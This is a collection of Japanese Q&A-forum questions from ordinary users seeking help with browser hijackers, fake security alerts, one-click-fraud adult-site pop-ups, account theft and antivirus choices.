IEを開くと設定した覚えのないスタートページやDLした覚えのないツールバーが開くようになりました。とても不安です 最近IEを開くと設定した覚えのないスタートページやDLした覚えのないツールバーが開くようになりました。 先ほどはdayz startというページがホームページに設定されていて DLした覚えのないツールバーが二個ほど表示されています ツールバーを消したいのもやまやまなのですが どれをアンインストールしたらいいのかもわかりませんし ツールバーの名前も分かりません・・・ ウイルスクリアには入っていますが もう一つのスキャンソフトで picpac.info？と言う名のサイトが危険だと警告がきました。 picpac.infoはIEではなくchromeを立ち上げたときに 表示されていましたが今は設定を無理やりなおしたため 表示はされません きくところによるとこのサイトはスパムサイトだということですが 私のパソコンは大丈夫なのでしょうか また、このサイトがIEの設定がかわったことと関係があるのでしょうか すごく不安です 回答お待ちしております
ウイルスバスター２００９を使っていましたが、すろそろ期限が切れるので、更新するか、 それともマカフィーにするか悩んでいます。 どちらがどうなのか、よくわからないのですが、 それぞれの特徴や違いなど教えていただければお願いいたします。
Ｗｅｂで間違えて操作によって、不適切（アダルト）登録されましたとの画面が表示されて こまってます。 これは、タスクマネジャーで「タスク終了」で一旦は画面から消すことができますが、 ２～３分後に再度表示されます。 永久に消す方法を教えてくだい。 パソコンは　Ｗｉｎ７　ＩＥ　です。
iphoneで外出先でネットをしていたところ　ふとステータスバーを見ると３Gではなく　wifi になっていました。 家を出る時に設定を変え忘れたようです。 ビックリして見てみると知らないwifiスポット（鍵印あり）に接続していました。 慌てて設定を３Gに変えましたが　不安になっています。 危険だと聞いていたので若干パニックになりながら３Gに変えたので　そのスポットの名前は失念してしまいました。 ネットをしたのは５分位です。 情報を抜かれたり個人情報をばらまかれる事もある、などと聞きます。 こうなってしまった場合　こちらでどんな対処をしたらよいのでしょうか。 カテ違いだったらすみません。
ＰＣにフリーソフトでＡＶＧとアバストをいれたのですが、無料版は、1月しかもてないようですが、やはり有償ノソフトにしたほうが、良いのでしょうか？あと無償版を継続して使える方法などあれば、おしえてください。また二つのソフトを一緒にいれておくのは、トラブルに成り易いのでしょうか
ホームページのスタートページの設定。 Windows7Ultimateを使用しています、ホームページをMSNjapanに設定するのですがパソコンを再起動すると「http://search.conduit.com/?SearchSource=10&ctid= …」の検索ページがホームページのスタートページになっています。何度も繰り返していますが,MSNjapanをスタートページとして固定したいのですが、どこを削除修正が必要かわかりません、ご案内ください。
今日の朝頃パソコンでアダルトサイトで動画を見ようとした際まず年齢確認その後ファイルを開くを押してまた年齢確認が出てくきて動画再生にしたら動画の横に小さく180日定額80000円とかかれてあったので動画再生を止めてデスクトップに戻るとこの画面が出てきて消しても何度も出てきます。どうやったらこの画面を消せるのでしょうか？至急教えて下さい。
現在REGZAの３２Ａ９０００のテレビを利用しています。 他の部屋でそれなりのレコーダーなども使っていますので、安価なレコーダーを探しています。 親が利用する予定ですので、操作方法が簡単で、容量も小さくてかまいません。 地デジとＢＳが録画できれば良いだけで、ダブル録画などは不要です。 お勧め商品などがあれば、教えてください。
OSはWindows7のSP1です。 ウイルスバスター2012を主に使い、サポートとしてAd-Aware(リアルタイム無しで)を使っていました。 この５月にAd-Awareが新しくなったのでさっそく乗り換えたのですが、今までできた日本語化ができなくなってしまいました。 リリースしたばかりのせいか、使い方を説明しているサイトも少なく、英語に四苦八苦しています。 調べてみるとトラブルも多いようなので、この際別のソフトに変えたいと思います。 ウイルスバスターと相性のいいフリーソフトで、できれば日本語対応(またはパッチあり)のものがありましたら教えてください。 日本語じゃなくても詳しい使い方がわかればなんとかなります。 無料のものでお願いします。
アメブロで相手（タレント）のページに 自分のIDをアクセス履歴に 残さず閲覧したいのですが 可能ですか 相手のブログを自分のマイページ に登録していますが 例えば、マイページからアクセス せず、ヤフーなどの検索エンジン から名前を検索してそこから 閲覧すれば残りませんか？ 何か変な事するわけではなく 単純に自分の履歴を残したく 無いだけです お手数おかけします よろしくお願いいたします
この画像のようなやつがいっつもでてきて、消してもなんかいかでてきます。どう処理すればいいですか？　パソコンをぶちぎりしてから、こうなりました。どうやって、セキリティの警告をしょりすればいいですか　？
エロサイトの登録完了画面をデスクトップから消す方法 エロサイトの登録完了画面が、デスクトップに張り付いたまま、消えなくなってしまいました。 ネットサーフィンで適当に色々行っていたらこうなってしまいました。 邪魔くさくて仕方ないです。 ただ、このパソコンは保護者の制限がかかってしまっているため、 システムの復元やソフトのダウンロードができません。 どなたか、それ以外で登録画面を消す方法を教えていただけないでしょうか。 よろしくお願いします。
パソコンのデスクトップ画面に何も自分で操作を した覚えが無いけど、眼鏡を開いた状態で机の上に 置いたような画面がでて困っています。どんな現象か、 あるいはどう対処したらいいか教えて下さい。宜しく お願い致します。
ネットで検索する場合、URL入力が苦手で面倒なので文字入力しています。 このたび、スパイウェアのようなものが入ってしっまったのですがこれは検索の方法に問題があったのでしょうか。
始めて質問させていただきます。 タイトルの通りなんですが、盗聴について質問です。 最近iPhoneから実家の固定電話にかけるとき、ブチっと 音がします。母親には聞こえないみたいです。 呼び出し音に入る前に音がします。 盗聴について少し調べてみたんですが、ノイズ音がするらしいですが、ノイズ音は しません。 でも不安なので質問させていただきました。 携帯の盗聴は難しいみたいですし、それなりに知識も必要みたいなんですが盗聴の可能性はあるんでしょうか？ また、調べる方法はあるんでしょうか？ iPhoneでは普通のことなのかな？とも思ってるんですが... 質問に答えていただけたら、嬉しいです。
誰か教えて下さい。 先日携帯のアダルトサイトを見ていました 利用規約を読み料金は発生しないものと思いアクセスしたのですが 利用規約の2ページ目に当サイトは自動入会・後払いシステムで 利用規約同意の上、お客様の年齢を入力いただき次へボタンを クリックした時点で登録完了となり料金が発生すると 書かれていました。 登録したお客様は本規約に同意したものと・・・ 料金は99000円と書かれています。 退会処理については退会処理金99000円を振り込んだ後に 退会になると書かれていました。 閲覧サービスはクーリングオフの対象にならないとも書かれていました、 支払い期間3日以内にしはらわなければならないのでしょうか、。 うっかりアダルトサイトでクリックしてしまったのを後悔しています どなたか教えて下さい。
社内のPCが、このs.m.a.r.t. Checkという、ウィルス？だか何やらに感染しました。 LANは外しました。 アクティベートコードを見つけアクティベートは完了して、Virus and spy protectionの完全スキャンは終わり(感染なし)とMicrosoft safety scannerのスキャン実行中(既にひとつ感染らしい)です。 この感染を駆除すれば、PCの初期化は必要ないでしょうか？
数週間前に動画か音声の編集・録音・閲覧関係のソフト（たしかラジオの録音ソフトだった気がします） をダウンロードしたのですが、 その時に「sweetim」というソフトも一緒にダウンロードされてしまいました。 グーグルクロームを利用した際（普段はＩＥを利用しています。）にトップページが変わっていたので不審に思い少し調べたところ ホームページのアドレスが「sweetim」になっていたことと、このソフトがダウンロードされていたことに気づきました。 その時にsweetim関連の２つのソフトをコントロールパネル経由ソフトウェアの管理画面でアンインストールしました。 そして今日、クロームを久々に使い、アドレスバーで検索を掛けるgoogleの検索結果ではなく、あの「sweetim」の検索サイトで結果がでてきて、調べてみたところこのソフトがどういうものなのかということに気付いた次第であります。 また起動時に（今まではでなかった）windows live massangerのログイン画面が現れる現象も起きています。 調べた結果「sweetim」はウイルス？スパイウェア？であり、 また数々の質問サイトで「レジストリ」？を削除するという方法があるということがわかりました できるだけ費用はかけたくありません。ですがコンピューターの動作不良や個人情報の流失など大きな影響がある場合はやむおえないと思っています。 そこでお聞きしたいのが、まず (1)sweetimが及ぼす影響とは (2)レジストリの削除はどのようなリスクを伴うのか (3)レジストリの削除は初心者でも容易にできるのか (4)ほかにしなくてはならないことはあるのか (5)また初心者によるレジストリの削除が危険な場合、現在購入しているウイルスソフト（ノートン）のサポートに相談して駆除してもらうべきか、またほかの方法は何かあるのか。 以上が自分の疑問であります。 また原因となったソフトウェアがなんだかも特定できていず、アンインストールしたか、してないかもわかりません。 今回の質問内容とは少しずれた疑問なのですが ＩＥ８のダウンロード履歴を確認する方法をご存知の方はこちらもお願いします。 これは質問ではないのですがsweetim.comがノートンで安全サイトに認定されているのが不思議に思います。 最後に 長文質問失礼いたしました。 大変困っていますのでご存知の方は回答・アドバイスお願いします。
たぶんFACE　BOOK経由だと思われるのですが、 ”３DEALS！”という無料クーポンを語る英語のポップアップウインドゥが 削除できません。 ウイルスバスターでも、システムの復元でもダメでした。 Windows7 IE9.0.5
似たような質問があるようですが、 ネットの接続を切断している状態でも、勝手に開くアダルトサイトの ポップアップウィンドウにやられてしまいました。 何かの締め切り時間がカウントダウンされて、気持ち悪いです。 削除するためにはどこを、どのようにすればよいのでしょうか？ アクセス権が云々で削除できないファイルもありますが、 それらを削除する方法もお知りでしたら、教えてください。 よろしくお願いします。
先週オンラインゲームのパスワードを何者かに盗まれて（クラッキングというのでしょうか？）すべての装備品などが売られる被害に合いました。 その後パソコン全部をウィルスソフト(Microsoft Security Essentials）でパソコンすべてをスキャンしたのですがスパイウェアなどはみつからなかったのでオンラインゲームの方はパスワードを変更して一先ず安心していました。 その後ＧＭＡＩＬを確認すると、ＧＭＡＩＬにポップアップが現れて中国からのアクセス履歴があると表示されていたのでＧＭＡＩＬのパスワードも変更しました。（オンゲーと同じパスにしてしまって失敗したと思っています） しかし今朝パソコンをチェックすると再びオンラインゲームのパスワードが何者かに盗まれ、変更され、されに装備もすべてまた売られていました。 さらにはＧＭＡＩＬのパスワードも変更されていて自分のメールボックスにすらたどり着くことすら出来ません。。。。 誰か助けてください、自分ではもう同対処したらいいかわかりません・・・。
ネットのセキュリティに真面目に取り組もうとしている初心者です。 相談箱やほかのサイトでも調べていますが、情報が分散的でいまいち系統立てて理解できません。 ネットの仕組みから、世間にはどのような悪用があり、どうやってPCおよび個人情報を守る対策をすればいいのか、初心者でも理解しやすい書籍・Webサイトがありましたら、お教えください。 一冊の書籍に網羅されていなければ、複数お願いします。また、皆様の学習方法などもお教えいただければ幸いです。 よろしくお願いいたします。
アダルトサイトを見たときに、保存していることを表現する(地球からファイルへ点線を伝って送られてくるような図）小さなウィンドウが勝手に開き、何かをダウンロードしているみたいでした。一番上には保存完了の文字が出てました。 何もなく終わったと思いきや、ピクチャーライブラリーに大量すぎる普通の画像ファイルやショートカットやHTMLが保存されていました。 アイコンがgoogleのマークが重なったような変なもので、セキュリティソフトの説明書までありました。 あまりに大量すぎて削除しきれません。 何か削除する方法を教えてくださいませんでしょうか。 フリーソフト使用の場合は、安全性についてもおねがいします。 あと、削除できた場合、スパイウェアの危険性は残るのでしょうか。 どうか、ご回答よろしくおねがいいたします。 windows7 google chrome 使用
先日、クレジットカードに心当たりの無い請求が来たので問い合わせたところ、チャットサイトに支払われていると説明されました。 しかも、登録されているのが私が昔作った「gmail」で登録されていました。 この「gmail」は資料請求の時使うだけで、年に数回しか使っていなかったので気が付きませんでした。 PCはwinXPで「ウイルスバスター」を入れています。 接続はフレッツ光で、室内はiPhoneを買った時にもらった「FON]ルーターを使っています。 クレジットカードはオンライン決済にも、町のショップでも使用しています。 警察に調べてもらったら私のPCからサイトに入っているとのことです。 私は絶対にやっていませんし、家族もやるチャンスは全くありません。 本当にこんな事ってできるのでしょうか。 また、二度とこのような事が起きないようにするにはどうしたらよいか教えて頂ければ幸いです。
今年の１月くらいから、googleを使っているとたまに 「ご使用のコンピュータ ネットワークからの異常なトラフィックが検出されました」http://support.google.com/websearch/bin/answer.p … というページが表示されます。 スパイウェアに感染してしまっている可能性ありということですが、 この表示が出たほとんどの場合感染しているのでしょうか？ ウィルスバスター2012などでコンピュータ全体をスキャンしてもウィルスは見つかりませんでした。 それでもたまにこの表示が出るので・・・ ちなみに環境は無線ＬＡＮで、家には二つのノートパソコンがあり その両方を別に同時に使用していることがあります。 原因はこれでしょうか？ それとも、本当にスパイウェアに感染していたり、 誰か外部から無線ＬＡＮに進入されているのでしょうか？ 詳しい方どうかおねがいします。
上記のスパイウェアをspy botにて検出したのですが、削除しようとすると ファイルがメモリ上にある為削除出来ませんというエラーが出てしまい、 再起動後に駆除できますというメッセージが出たので再起動もしたのですが 再度スキャンをするとまた検出されてしまいます。 また、他のHPで取り上げられていた以下の方法も試してみました。 (1)スタートアップからの削除→削除対象のファイルが無い (2)Program FilesのRelevantKnowledgeフォルダの削除→フォルダが無い (3)Spybotのシステムスタートアップからのrlvknlg.exeの削除→対象ファイルが無い どうしたら駆除できるかどうか、ご存知の方がいらしたら教えて下さい。 よろしくお願いします。
　、以前のＰＣが壊れてしまい新しいのを買いましたが、前のＰＣからバックアップしていたデーターを開き確認していたところ、いきなり起動画面にアダルトサイトの窓が入り込み、全く消せなくなりました。恥ずかしいのですが消し方を教えていただけないでしょうか。
スパイソフト対策用のソフトで一番いいやつありますか？ ちなみに今はウイルスセキュリティＺＥＲＯを使ってます。 このソフトでもスパイソフトを検索できるんでしょうか？
Ｗｉｎｄｏｗｓ　ＸＰ Ｉｎｔｅｒｎｅｔ　Ｅｘｐｒｏｒｅｒ Version 8.0 です セキュリティーソフトはNorton Internet Securityです ネットを使おうとダブルクリックしたらいつもと違うトップ画面が出て、アドウェアが検出されました。 その画面には、 『ノートンのホームページの保護 ご使用中のシマンテックのセキュリティ製品が脅威を検出したため、ホームページが再設定されました。 ご使用中のシマンテックのセキュリティ製品がマルウェアの脅威を検出しました。 悪質なマルウェアによって、ブラウザのホームページが変更されています。 ご使用中のシマンテックのセキュリティ製品がこのマルウェアを検出して除去し、システムを保護しました。 シマンテック製品ではマルウェア攻撃を受ける前のホームページ設定を特定できないため、この ウェブページで設定を行ってください。 ブラウザのホームページを再設定して、お客様が選択したウェブページに戻す方法についての説明をご覧になるには、下のオレンジ色のボタンを押してください。』 と言ったものです。 Ｎｏｒｔｏｎ　Ａｎｔｉｖｉrusでシステムの完全スキャンを行い解決？され良かったと思い再びネットを開くとまた同じトップ画面が出てきました 下記オレンジ色のボタンでウェブページの設定方法が載っており、コントロールパネル→インターネットオプションで標準に設定しました そして再びダブルクリックして開くと、またアドウェアの警告がでました 内容は、 ホームページ保護の警告「ホームページを別のｗｅｂアドレスに変更しようとする試みをＮｏｒｔｏｎ　Ａｎｔｉｖｉｒｕｓが遮断しました」 プロセス名　ｒｕｎｄｌｌ32.ｅｘｅ 場所　ｃ：￥ｗｉｎｄｏｗｓ￥ｓｙｓteｍ32￥ｒｕｎｄｌｌ３２．ｅｘｅ 他にも、ＧｏｏｇｌｅＴｏｏｌｂａｒＩｎｓｔａｌｌｅｒ_ Updater_ｓｉｇｎｅｄ．ｅｘｅ　というプログラムや、 Ａｄｗａｒｅ．Ｌｏｐ　というリスク名もセキュリティ警告がでました どうしたら駆除できますか？
　ＵＳＢメモリやデジカメを接続すると（ＵＳＢ端子）、アイコンが表示されるかと思います（ハードウェア認識）。 　そのアイコンの形状が、いつの頃からかこんなのへ勝手に変化しました。以前はごく一般的な形をしてたのですが・・・。 　前からＵＳＢメモリがウイルス感染した疑いもあります。スパイウェアその他、何か問題が生じているのでしょうか。除去等の対処法は・・・？　
Googleを使った行動はすべて監視され、ユーザーのプライバシー、閲覧サイト、趣味、趣向、性癖まで丸裸 (AdSense広告、Analyticsアクセス解析を使用しているサイトからの情報含む) http://amaebi.net/archives/1889594.html http://www.washingtonpost.com/business/technolog … Googleが現地時間24日、3月1日から新しいプライバシーポリシーを導入すると発表しました。 ３月１日以降、ネットでGoogleを使った行動はすべて監視され、ユーザーのプライベートはなく、閲覧サイト、趣味、興味あるものから性癖まですべて丸裸にされます。 それらのデータはGoogle のデータベースに登録され、Gmailで広告に勝手に入ってきたり、Youtubeで視聴した動画内容にあった広告表示で関連した商品の購入を勧められたりすることになります。 もちろん購入もメールの既読も個人の自由ですが、ニュースで芸能人が痩せて綺麗になったといった記事を読んだり動画を見た直後PRメールが届き、そのメール内容が「これでダイエット成功！」みたいな広告だったりすると、「あれ？これさっき見てたやつじゃん」と、ちょっと気持ち悪くなりますね。 さらにタチの悪いことに、そうされることを拒否する権利はユーザーにはなく、「嫌なら使うな」ということでGoogleを使うか、使わないかの２択しか残りません。 ちなみにこれまで健全だったのに・・・というわけではなく、こういった試みはかなり昔から始まっており、今回のプライバシーポリシー改訂統合ニュースでいよいよ表面化してきたところです。 たとえば現在かなりのシェアを誇る人気ブラウザGoogle Chrome ですがこれも実は完全クリーンな無料ブラウザというわけではありません。 Chromeをインストールすると、ユーザーを識別する固有IDが同時にインストールされ、GoogleのサーバーにChromeの利用情報が送信される 仕組みになっていることを知らずに使っている人は多いと思います。。
　これってウイルス感染の表示なのでしょうか？　対処法はありますか？
以前、衆議院でサイバー攻撃にあったって話題になりましたよね？ このニュースをふと思い出したのですが、あの攻撃って、 Nortonとか入れても防げなかったものなんでしょうか？ 以前、ガンブラーに犯されたサイトにアクセスしてしまったときも、 Nortonがブロックしてくれたことがあるので、ちょっと疑問です。 国会議員せんせーのセキュリティソフトのインストール状況が アホみたいな状態だったからなのか？ それともNorton先生を上回るレベルの攻撃だったのか、 どっちなんでしょうか？ もし後者なら高い金払ってセキュリティソフトを インストールする意味って何だろうと思いまして…。
HGSEALD for webをアンインストールしたのに、何度もインストールされようと小窓が出て困っています。とくにIEを起動しようとするとWindowsインストーラの小窓が出てきます。 プログラムの一覧で削除ボタンを押してもなぜかマイドキュメントフォルダが表示されて削除が始まりません。再起動しても一覧に残っています。 一応、手動でファイルを探してゴミ箱に捨てたのに、まだ何度もインストールされようとします。その後は探しても「HGSEALD」では見つかりません。どうしたらいいでしょうか？ これはキャプチャー防止ソフト？のようですが動作がウイルスみたいです。ウイルスソフト側でマルウェア検知もよくするようになりました。 PCはWindowsXPです。どうしたら完全に削除できますか？リカバリ以外で方法はありますか？ 詳しい方よろしくお願いしますm(_ _)m
元々、ウイルスバスターが入ったPCを使用しているのですが、あるマンション物件のネットを閲覧中、ウイルスバスターと思われるメッセージ‘以下を隔離しました‘が出て、ネッとメールトが落ち、マイクロソフト社のウイルスマークに似たマークがツールバーの右下に出て、ウイルスバスターのマークが消え、いきなり英文のインターネットセキュリティがウイルススキャンを始めました。 しばらくして、そのPCのIPアドレス等の情報が別ウインドウで表示され、英文で、ブロックするならクリックと表記、クリックすると、また別ウインドウで、ブロックするならYES、しないならNOの表記。YESをクリックすると、ウイルスソフト購入画面が英文で表示。 それ以降、メールもネット（エクスプローラー）も立ち上がらなくなり、デスクトップには、そのマイクロソフト社のウイルスセキュリティーに似たマークのショートカットが自動で作成されていました。 アプリケーションの追加と削除の中にはウイルスバスターはあるのに、そのインターネットセキュリティはなく、削除することもできません。 スパイウエアかウイルスのたぐいでしょうか？感染したのでしょうか？PC内の情報が流出した恐れはありますか？ 詳しくないので、不安です。ご存知の方がいらっしゃいましたら、教えていただけますでしょうか。
Spybotでスキャンしたところ 「ChameleonTom.Toolbar」が発見されました。 修復/削除しようとしましたが 「いくつかの問題箇所が修復/削除できません。理由は ファイルがメモリ上にあるためです。この問題は 再起動後に修正/削除できます。 次回のシステムスタートアップでSpybot-S&&Dを 起動しますか」とは出るので 「はい」を選択するのですが変化がありません。 わかる方がいらっしゃいましたらよろしくお願いします。
クレジットを導入しようとして、ある大手クレジット会社からメール添付で手続きファイル送られてきました。ダウンロードしようとしたら、またたく様な動作と共に開けません。ガードがかかっているのかもしれませんが、どのようにしたら導入できるのでしょうか？
息子が数日前にひっかかってしまいましたがクッキーや履歴の削除をし、ウィルス・スパイウエアのスキャンをしましたが消えず、システムの復元は使えないPCで困っています。 以前はこの相談室でフリーソフトを紹介していただきましたが今の詐欺サイトも有効でしょうか？たびたびで済みませんが教えてください。
IE8のお気に入りに”便利なインターネットサイト、benriweb”というサイトがいつも勝手に追加されます ブロックするにはどうすればいいでしょうか？
Registry Winnerというソフトをダウンロード購入して使っているのですが、このソフトはあまり評判が 良くないようです、今の所は何も障害は無い(気がつかないだけかも)様ですが、 どなたか同じソフトを使っている方おりましたら使用具合など連絡ください。 ちなみにこのソフトは"Registry Winner"と"Defrag Winner"がセットになっていて3年間4500円でした。 何か悪さをするものであればアンインストールしなくてはと思い投稿しております、 どなたか宜しくお願いします。
ウィルスが”いた”（発見、検出）のと”動作している”の違いはなんでしょうか また”感染”していると、ただ”いた”の違い・・・ スキャンで発見されたら、もうウィルス（トロイなど）は動いてるのでしょうか？ たとえばこの間トロイみたなのがファイル名”A*****.exe"というかたちで発見されましたが この”A*****.exe"というのを実行はしていません 実行したら、ウィルスが活動し始めるのですよね？実行しない限りはただ”いた”だけであり”動作”はしていないと認識しているのですが・・・ （ただこの”A****.exe"は以前増えました） 認識間違っているでしょうか？
　　　無料を謳っているのに、クレジットカードなどと心配な語句が有ります。 どのようなことを書いてあるのか教えてください。 　ちなみに、使用は止めて居ます。 <!--タグはここから--><table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><a href="http://www.rays-counter.com/"><img src="http://www.rays-counter.com/d144_f6_022/4f17b2e7 … alt="アクセスカウンター" border="0"></a></td></tr><tr><td align="center"><a href="http://goods-fun.net/"><img src="http://www.rays-counter.com/images/counter_01.gif" border="0" alt="GoodsFun-グッズファン"></a><a href="http://www.e-creditcard.info/"><img src="http://www.rays-counter.com/images/counter_02.gif" border="0" alt="クレジットカード比較"></a><a href="http://fx-ch.com/"><img src="http://www.rays-counter.com/images/counter_03.gif" border="0" alt="FX比較サイト"></a><img src="http://www.rays-counter.com/images/counter_04.gif" border="0"><a href="http://engagement-r.net/"><img src="http://www.rays-counter.com/images/counter_05.gif" border="0" alt="婚約指輪サーチ"></a></td></tr></table><!--ここまで-->
PC(VISTA)を立ち上げると勝手にアダルトサイトのポップアップが出ます。 出ないときもあるのですが突然出たりします。 そうならないようにするにはどうすれば良いかどなたかご指導お願いします。 尚、msconfigからのスタートアップには不審なものはありません。
　2012年1月1４日、インターネットで色々、調べ物していたら、突然”XPHomeSecurity2012　アラート　”なるものが現れ、ネットが見られなくなってしまいました。 　トレンドマイクロさんのセキュリティインストールしていたのに、何で？ 　それから色々試してみたが、どうにもなりません。 　アクティベーションコードらしき物2個ネット検索しヒットし、入力しましたが、エラーです。exitできません。 　亜種なのかな、誰か助けてください。 よろしく。
或る都下のインターネット業者と喧嘩してまして、その所為か何の操作もしないなか、USBポートから外付けのデバイスを抜き差しするとき鳴るwindows 7の音がしたのです。気になって、常駐させているsecurity softを起ち上げた処、これまで見たことの無かったメッセージで”長らくウイルス・スキャンが為されていません。コンピューターが危険にされされている危険があります”と云う表示が出ているではないですか！ 　まめにメンテやユーティティー・ソフトでのスパイ・ウェアのチェックを行っていますが、確かに常駐ソフトではスキャンしていなかったので、久し振りにフル・スキャンで常駐・対ウイルス・スキャンを実行したのですが、幸い結果は白と表示されましたものの、４０分近くしたスキャン中”コンピューターが危険にさらされている危険があります”のメッセージが現れていました。 　一体、何らの操作もせずに、USBポートからデバイスを抜き差しする際に流れる操作音が出たのは、外部から何らかの侵入が図られたものと考えられないでしょうか？
PC内に挙動不審な怪しいファイルがあり、 対処の手順を迷っているのでご助言願います。 PC環境はAtomネットブックでWindows XP HOME SP3 HDDは160GBでNTFS、CドライブDドライブとも半分以上の空き容量あり。 使用4年目です。セキュリティソフトのインストール経歴無しですが、 Windows Updateは常に自動更新。 エクスプローラの設定では常に、全てのファイルとフォルダおよび 拡張子を表示させています。 これまで接続してきた外部機器のうち、USBメモリやSDカード等は 安全性に問題なし。 Cドライブのマイドキュメントフォルダに、 クレジットカードの明細書を保存してあるフォルダ(注1)があり、 そこに自分の意志で保存したわけではないファイルがあります。 このファイルが奇怪で困っています。 このファイルをまずは削除すべきでしょうか？ それとも、まずはウィルス対策ソフトをインストールすべきでしょうか？ 【奇妙に思える根拠】 ・自らの意志で保存したファイルではない 　(このPCを使用した人間は私ひとりです) ・属性が理解できず、拡張子もない ・隠しファイルである ・特に、削除しようとすると奇怪な挙動‥ ‥・ごみ箱に入れると分裂する ‥・連動して不思議な挙動をするファイルがあった ・結局、移動できない ・アップロードができない 【これまでの経緯】 ・3年半前、PC購入。重くなるのが嫌でセキュリティソフト導入せず。 ・3年前のある日、 　とあるオフィスにて、このPCを持ち込んで有線LANでWEB接続するも、 　まもなく不意になぜか同じ部屋のネットワーク上のフォルダがエクスプローラで 　見えてしまい、不気味に思いLANケーブルを外した。 　その部屋には数台のPCがあり、当時おそらく全てのPCから 　マルウェアが20～30個も検出された。USBメモリ感染型のウィルスもあった。 　だが持参した私のPCは、直後に2、3の有名なオンラインスキャンを実行しても、 　感染なしとの結果が出た。 ・2年前～半年前、2回ほどエフセキュアやMicrosoftのオンラインスキャンを実行し、 　問題なし(つまり、セーフモードでのスキャン経歴は無し)。 ・3ヶ月前、マイドキュメントのデータ量が大きくなったので、 　Cドライブにあるそのターゲットフォルダの、Dドライブへの変更を試みる。 　だが作業中にエラーが起こり、移動が自動停止。 　原因は上記「注1」の怪しげなファイルであると判明。 　このファイルの存在を初めて気付く。 　 　なお、「注1」のフォルダには、その2009年4月17日に ブラウザのIE6にて、CSVファイルを WEBからダウンロードしている。それ以降、 問題のファイルの作成日とされる4月25日や4月27日までに、 IEで保存作業をしたことは無かった可能性がある。 つまり4月25日や27日においてブラウザによるファイル保存の デフォルトのターゲットフォルダが「注1」になっていた可能性あり。 　＜3ヶ月前にあったファイルの詳細と経過＞ 　《『(ここでの通称)』：ファイル名、サイズ、種類、更新日←エクスプローラの「詳細」表示より：備考》 『A』：　CAEV81Q3　、54.5KB、ファイル、2009/4/27　：移動可能 『B』：　CAEV81Q3.　、　 0KB、ファイル、2009/4/27　：隠しファイル、ファイル名末尾にドット 『C』：　CAW5005Z　、52.5KB、ファイル、2009/4/25　：移動可能 『D』：　CAW5005Z.　、　 0KB、ファイル、2009/4/25　：隠しファイル、ファイル名末尾にドット ・3ヶ月前の不審なファイルは以上の4つ ・BとDは、どういうわけか移動不可能となる時があった(注2) ・Cのプロパティには、『タイトル』欄に、 　そのオフィス特有の業界用語の入った日本語名が記載、 　『作成者』欄にも日本人名で記載あり。BとDのそれは、 　記憶では記載なし。Aのそれは未確認。 ・Cは間もなく削除した。 　＜数日前に行なった削除作業の詳細＞ エクスプローラによるゴミ箱への移動が、 A：可能 B：可能 D：不可 となる事を確認。まずはAのみをゴミ箱へ移動した。 次にBも試みたら、不可となった。 しかたなくAをゴミ箱から戻したら、Bの移動が可能になった。 そこでBのみをゴミ箱へ送った。すると、なぜか ゴミ箱に入ったBが分身の術のように2つのファイルになった。 このときの状態は、 A　　　　 ：＠『注1』フォルダ、54.5KB、『タイトル』および『作成者』は未記載 B(1個目)：＠ゴミ箱　　　　　、 56.0KB、『タイトル』および『作成者』は、Cに同じ B(2個目)：＠ゴミ箱　　　　　、 56.0KB、『タイトル』および『作成者』は、Cに同じ D　　　　 ：＠『注1』フォルダ、0バイト、『タイトル』および『作成者』は未記載 ‥つまりBはそれぞれサイズも増え、プロパティに情報が追加された。 次にB(1個目)をゴミ箱から削除した。直後B(2個目)の削除も試みたが、 移動できないとのエラーで不可。さらにB(2個目)を元のフォルダに戻そうと試みるも、 同じエラーで不可。つまりB(2個目)はゴミ箱から移動不可となった。 その後 http://wincustomizing.client.jp/hdd-file.html 上記リンクの［Point 3］の手順『1＞＞』でB(2個目)＠ゴミ箱 の削除を試みるも、 コマンドプロンプトの窓へのペーストが不可。そこでDに対して手順『1＞＞』を 試み、手順『1＞＞』は完了した。次に手順『2＞＞』も終え、 手順『3＞＞』の[1]まで進んだら、『Dは見つかりません』とのエラーが出た。 ここで「explorer exit」のコマンドを打たずに、コマンドプロンプト窓の 右上タイトルバー『X』をクリックし、そしてタスクマネージャの シャットダウンメニューからシステム再起動をした。 するとゴミ箱にあったはずのB(2個目)が消え、『注1』フォルダに戻っていた。 そして『注1』フォルダにあったはずのAが、PCから消失してしまった (PC内でファイル名検索をしても見つからず)。 　＜その再起動後から現在までの注1のフォルダに見えているファイルの詳細＞ 　《(通称)：サイズ、種類、属性、更新日←エクスプローラ画面より：備考》 B： 0KB、ファイル、隠しファイル,システム、2009/4/27：移動不可、『タイトル』『作成者』は未記載 D： 0KB、ファイル、隠しファイル,システム、2009/4/25：移動不可、『タイトル』『作成者』は未記載 　＜そのほか補足＞ ・この怪しいファイルは、エクスプローラの画面左側の表示と 　ファイルを右クリックしたプロパティの記載内容が一致しない。 　例えばBが前者では『属性：隠しファイル , システム 　　更新日時：2009年4月27日、13:36』とあるが、 　後者を見ると 　『属性　　□(チェック無し) 隠しファイル　、 　　作成日時　更新日時　アクセス日時　(いずれも未記載)』。 　‥つまり、アイコンも半透明で、 　　　エクスプローラの左画面でも隠しファイルとされておまけに 　　　システムファイルである(？) (注3) とされているが、 　　　プロパティでは隠しファイルとされてなく、各日時のデータも無い。 ・『注2』：BとDはそれぞれ、ドットのないファイル名で対になっているAやCが 　同一のフォルダに存在する場合にのみ移動可能となり、 　そうでない時には移動不可能である、と推測されます。 ・『注3』：「属性　システム」との記載が、 　いわゆる「システム属性」であることを示しているのであれば、 　ウィルスが作成したファイルである可能性が強まりますよね。 　削除作業は以下リンクの終盤の記述が参考になるでしょうか？ 　http://www.tef-room.net/trouble/file-delete.html ・BとDを、オンラインスキャンサイトのファイルスキャナーでスキャンしようとしたり、 WEBメールサイトで送信時の添付ファイルスキャン機能を使ってスキャンしようと 試みても、ファイルが存在しないというエラーが出てしまいます。 【今後の予定 (順不同) 】 1・Windowsチェックディスクの実行 2・ウイルス対策ソフトのインストール 3・不審なファイルの削除 ⇒この作業順序は、1→2→3の順が最適なのでしょうか？ また、その他にもすべき作業がございましたらご教示頂ければ幸いです。
ネットで普通の動画サイトだと思い押していると、勝手に有料動画サイトに登録しましたと掲載され、お金を振り込んで下さいといった内容が掲載されました。その後、１分おきくらいに勝手にインターネットエクスプローラーが起動し、有料動画サイトにリンク。ほおっておいても、どんどんインターネットエクスプローラーが起動するようになりました。 もちろん契約の錯誤を理由に支払はしません。 ただ、勝手にインターネットエクスプローラーが起動しないようにしたいです。この質問を打ちながらも、どんどんインターネットエクスプローラーが起動し、その都度中断されます。 （パソコンはVistaを使用しています。） パソコンに詳しい方誰か助けてください。
